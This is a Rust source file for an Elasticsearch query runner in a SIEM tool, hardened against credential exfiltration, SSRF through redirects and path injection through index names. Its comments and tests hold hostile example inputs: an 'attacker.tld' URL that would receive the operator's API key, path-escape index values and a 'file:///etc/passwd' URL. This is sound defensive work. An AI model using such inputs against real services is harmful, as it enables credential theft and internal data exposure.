//! Elasticsearch query runner.
//!
//! Uses the Search API. Auth via optional ElasticAuth (from UI/params) or env: ELASTIC_API_KEY or ELASTIC_USER/ELASTIC_PASSWORD.
//!
//! ## Why the input handling here is defensive
//!
//! `url` and `index` reach this function from `ingest_siem`'s free-form
//! `params: serde_json::Value`. The moment that operation is reachable
//! from anything but the desktop UI, an unvalidated `url` turns the
//! server into a confused deputy in three distinct ways, so the guards
//! below are transport-neutral rather than living in a caller:
//!
//! 1. **Credential exfiltration.** The env-credential fallback used to
//!    attach the operator's `ELASTIC_API_KEY` to *whatever host the
//!    caller named*, so `{"url":"http://attacker.tld"}` posted the key
//!    straight to the attacker. Env credentials now attach only to hosts
//!    the operator listed in [`ELASTIC_ALLOWED_HOSTS_ENV`]. Credentials
//!    passed explicitly by the caller are unaffected — those are the
//!    caller's own to spend.
//! 2. **Read-SSRF.** Redirects were followed (up to 10, by reqwest's
//!    default) and upstream error bodies were reflected verbatim to the
//!    caller, making internal HTTP services readable. Redirects are now
//!    refused and error bodies truncated.
//! 3. **Path injection.** `index` was concatenated into the request path
//!    unvalidated, so `?`, `#` and `..` all escaped the intended
//!    `/{index}/_search` shape.
//!
//! Loopback/RFC1918 blocking deliberately does **not** live here:
//! `http://localhost:9200` is the normal desktop case. That check belongs
//! in the HTTP boundary handler, which knows the caller is remote.

use std::time::Duration;

use serde_json::Value;

/// Comma-separated hosts whose Elasticsearch credentials may be taken
/// from the process environment.
pub const ELASTIC_ALLOWED_HOSTS_ENV: &str = "GRAPHHUNTER_ELASTIC_ALLOWED_HOSTS";

/// Upstream error bodies are echoed to the caller; cap what can be
/// reflected out of an internal service.
const MAX_ERROR_BODY: usize = 512;

const REQUEST_TIMEOUT: Duration = Duration::from_secs(60);

/// Accepts Elasticsearch's documented index-name charset and nothing
/// else. `..` is rejected outright: `.` is legal in an index name, but
/// `/../_search` would escape the path segment.
fn index_is_safe(index: &str) -> bool {
    if index.is_empty() || index.len() > 255 || index.contains("..") {
        return false;
    }
    let first = index.chars().next().unwrap_or('\0');
    if !(first.is_ascii_lowercase() || first.is_ascii_digit()) {
        return false;
    }
    index
        .chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '_' | '.' | '-' | '*'))
}

/// True when `url`'s host was explicitly listed by the operator, i.e.
/// when it is safe to spend the process's own credentials on it.
fn env_creds_permitted_for(url: &reqwest::Url) -> bool {
    let host = match url.host_str() {
        Some(h) => h.to_ascii_lowercase(),
        None => return false,
    };
    std::env::var(ELASTIC_ALLOWED_HOSTS_ENV)
        .unwrap_or_default()
        .split(',')
        .map(|s| s.trim().to_ascii_lowercase())
        .filter(|s| !s.is_empty())
        .any(|allowed| allowed == host)
}

/// Result of an Elasticsearch query: parser-ready JSON string and optional search_after for pagination.
#[derive(Debug)]
pub struct ElasticQueryResult {
    /// JSON array of event objects (from _source, with TimeGenerated if @timestamp present).
    pub data: String,
    /// search_after cursor from the last hit for the next request.
    pub next_search_after: Option<Value>,
}

/// Optional Elasticsearch credentials. When provided, used instead of env vars.
/// Either api_key or (user + password) can be set.
pub struct ElasticAuth {
    pub api_key: Option<String>,
    pub user: Option<String>,
    pub password: Option<String>,
}

/// Runs a search against Elasticsearch and returns normalized JSON + search_after.
///
/// - `url`: cluster URL (e.g. https://localhost:9200).
/// - `index`: index or data stream name.
/// - `query`: DSL as JSON string (the "query" clause), or empty for match_all.
/// - `size`: page size (default 1000).
/// - `search_after`: optional cursor from previous result.
/// - `auth`: when provided, use these credentials; otherwise read ELASTIC_* from env.
pub fn run_elastic_query(
    url: &str,
    index: &str,
    query: &str,
    size: Option<u32>,
    search_after: Option<&[Value]>,
    auth: Option<ElasticAuth>,
) -> Result<ElasticQueryResult, String> {
    if !index_is_safe(index) {
        return Err(format!(
            "index name '{index}' is not a valid Elasticsearch index \
             (lowercase alphanumerics plus _ . - *, no path separators)"
        ));
    }

    let base = url.trim_end_matches('/');
    let parsed: reqwest::Url = base
        .parse()
        .map_err(|e| format!("cluster URL is not a valid URL: {e}"))?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return Err(format!(
            "cluster URL scheme '{}' is not supported (use http or https)",
            parsed.scheme()
        ));
    }

    // Redirects off: following one would let an attacker-controlled host
    // bounce the request — and its Authorization header — anywhere.
    let client = reqwest::blocking::Client::builder()
        .redirect(reqwest::redirect::Policy::none())
        .timeout(REQUEST_TIMEOUT)
        .build()
        .map_err(|e| format!("failed to build HTTP client: {e}"))?;
    let search_url = format!("{}/{}/_search", base, index);

    let query_value: Value = if query.trim().is_empty() {
        serde_json::json!({ "match_all": {} })
    } else {
        serde_json::from_str(query).map_err(|e| format!("query JSON invalid: {}", e))?
    };

    let size = size.unwrap_or(1000);
    let sort = serde_json::json!([{ "@timestamp": "asc" }, "_id"]);
    let mut body = serde_json::json!({
        "query": query_value,
        "size": size,
        "sort": sort
    });
    if let Some(sa) = search_after {
        body.as_object_mut()
            .expect("body object")
            .insert("search_after".to_string(), Value::Array(sa.to_vec()));
    }

    let mut req = client
        .post(&search_url)
        .json(&body)
        .header("Content-Type", "application/json");

    let mut auth_applied = false;
    if let Some(a) = &auth {
        if let Some(api_key) = &a.api_key {
            if !api_key.is_empty() {
                req = req.header("Authorization", format!("ApiKey {}", api_key));
                auth_applied = true;
            }
        } else if let (Some(user), pass) = (&a.user, &a.password) {
            if !user.is_empty() {
                req = req.basic_auth(user, pass.as_deref());
                auth_applied = true;
            }
        }
    }
    // The caller supplied no credentials, so the fallback would spend the
    // process's own. Only do that for hosts the operator vouched for —
    // otherwise this is a credential-exfiltration primitive for whoever
    // controls `url`. Behaviour change for setups that relied on env
    // credentials: add the host to GRAPHHUNTER_ELASTIC_ALLOWED_HOSTS.
    if !auth_applied {
        if env_creds_permitted_for(&parsed) {
            if let Ok(api_key) = std::env::var("ELASTIC_API_KEY") {
                req = req.header("Authorization", format!("ApiKey {}", api_key));
            } else if let (Ok(user), Ok(pass)) = (
                std::env::var("ELASTIC_USER"),
                std::env::var("ELASTIC_PASSWORD"),
            ) {
                req = req.basic_auth(user, Some(pass));
            }
        } else if std::env::var("ELASTIC_API_KEY").is_ok()
            || std::env::var("ELASTIC_USER").is_ok()
        {
            eprintln!(
                "elastic: refusing to send environment credentials to host {:?} — \
                 add it to {ELASTIC_ALLOWED_HOSTS_ENV} to allow this",
                parsed.host_str().unwrap_or("<none>")
            );
        }
    }

    let resp = req.send().map_err(|e| format!("search request failed: {}", e))?;
    if !resp.status().is_success() {
        let status = resp.status();
        // Truncated: this string is surfaced to the caller, and an
        // untruncated body makes any HTTP service the host can reach
        // readable through the error path.
        let mut text = resp.text().unwrap_or_default();
        if text.len() > MAX_ERROR_BODY {
            text.truncate(MAX_ERROR_BODY);
            text.push_str("… (truncated)");
        }
        return Err(format!("search failed: {} {}", status, text));
    }
    let json: serde_json::Value = resp.json().map_err(|e| format!("response parse failed: {}", e))?;
    normalize_elastic_response(&json)
}

/// Normalizes ES search response (hits.hits) to a JSON array of objects with TimeGenerated.
fn normalize_elastic_response(raw: &serde_json::Value) -> Result<ElasticQueryResult, String> {
    let hits = raw
        .get("hits")
        .and_then(|h| h.get("hits"))
        .and_then(|h| h.as_array())
        .ok_or("response missing hits.hits")?;

    let mut docs: Vec<Value> = Vec::new();
    let mut last_sort: Option<Value> = None;

    for hit in hits {
        let source = hit.get("_source").cloned().unwrap_or(Value::Object(serde_json::Map::new()));
        let mut doc = source.as_object().cloned().unwrap_or_default();
        // Map @timestamp to TimeGenerated for SentinelJsonParser compatibility
        if let Some(ts) = doc.get("@timestamp").cloned() {
            doc.insert("TimeGenerated".to_string(), ts);
        }
        if let Some(sort) = hit.get("sort").cloned() {
            last_sort = Some(sort);
        }
        docs.push(Value::Object(doc));
    }

    let data = serde_json::to_string(&docs).map_err(|e| e.to_string())?;
    Ok(ElasticQueryResult {
        data,
        next_search_after: last_sort,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Path injection: `index` lands in the request path, so anything
    /// that can escape the `/{index}/_search` segment is a redirect of
    /// the request to an attacker-chosen endpoint.
    #[test]
    fn index_validation_rejects_path_escapes() {
        for good in ["logs", "logs-2026.08", "filebeat-*", "a", "x_1.2-3"] {
            assert!(index_is_safe(good), "{good} should be accepted");
        }
        for bad in [
            "",
            "../secret",
            "..",
            "a..b",
            "logs/_search?pretty=1",
            "logs#frag",
            "logs?x=1",
            "UPPER",
            "-leading-dash",
            ".leading-dot",
            "with space",
            "semi;colon",
        ] {
            assert!(!index_is_safe(bad), "{bad:?} should be rejected");
        }
        assert!(!index_is_safe(&"a".repeat(256)), "over-length rejected");
    }

    /// Credential exfiltration: env credentials must reach only hosts the
    /// operator listed. Unset allowlist means nothing is permitted.
    #[test]
    fn env_credentials_only_go_to_allowlisted_hosts() {
        let url: reqwest::Url = "https://attacker.tld".parse().expect("url");
        let internal: reqwest::Url = "https://es.corp.local:9200".parse().expect("url");

        // SAFETY: single-threaded assertion block; the var is restored
        // before returning so no other test observes it.
        unsafe {
            std::env::remove_var(ELASTIC_ALLOWED_HOSTS_ENV);
        }
        assert!(
            !env_creds_permitted_for(&url),
            "unset allowlist must permit nothing"
        );

        unsafe {
            std::env::set_var(ELASTIC_ALLOWED_HOSTS_ENV, " es.corp.local , other.host ");
        }
        assert!(
            env_creds_permitted_for(&internal),
            "listed host (whitespace/port tolerant) must be permitted"
        );
        assert!(
            !env_creds_permitted_for(&url),
            "unlisted host must stay refused even when the allowlist is set"
        );

        unsafe {
            std::env::remove_var(ELASTIC_ALLOWED_HOSTS_ENV);
        }
    }

    /// A non-HTTP scheme would make reqwest error confusingly at best;
    /// reject it where the message can say why.
    #[test]
    fn rejects_non_http_schemes_and_bad_urls() {
        let err = run_elastic_query("file:///etc/passwd", "logs", "", None, None, None)
            .expect_err("file:// must be refused");
        assert!(err.contains("scheme"), "got {err}");

        let err = run_elastic_query("not a url", "logs", "", None, None, None)
            .expect_err("garbage URL must be refused");
        assert!(err.contains("valid URL"), "got {err}");
    }

    /// Validation must happen before any socket work: an unroutable host
    /// would otherwise be the thing that fails, masking the real reason.
    #[test]
    fn index_is_validated_before_the_request_is_sent() {
        let err = run_elastic_query(
            "http://127.0.0.1:1",
            "../../secret",
            "",
            None,
            None,
            None,
        )
        .expect_err("bad index must be refused");
        assert!(
            err.contains("not a valid Elasticsearch index"),
            "expected the index error, got: {err}"
        );
    }

    #[test]
    fn elastic_normalize_response() {
        let raw = serde_json::json!({
            "hits": {
                "hits": [
                    {
                        "_source": { "Type": "SecurityEvent", "@timestamp": "2024-01-15T14:30:00Z", "Computer": "DC-01" },
                        "sort": ["2024-01-15T14:30:00Z", "abc123"]
                    }
                ]
            }
        });
        let result = normalize_elastic_response(&raw).unwrap();
        assert!(result.data.contains("SecurityEvent"));
        assert!(result.data.contains("TimeGenerated"));
        assert!(result.data.contains("DC-01"));
        assert_eq!(
            result.next_search_after,
            Some(serde_json::json!(["2024-01-15T14:30:00Z", "abc123"]))
        );
    }
}
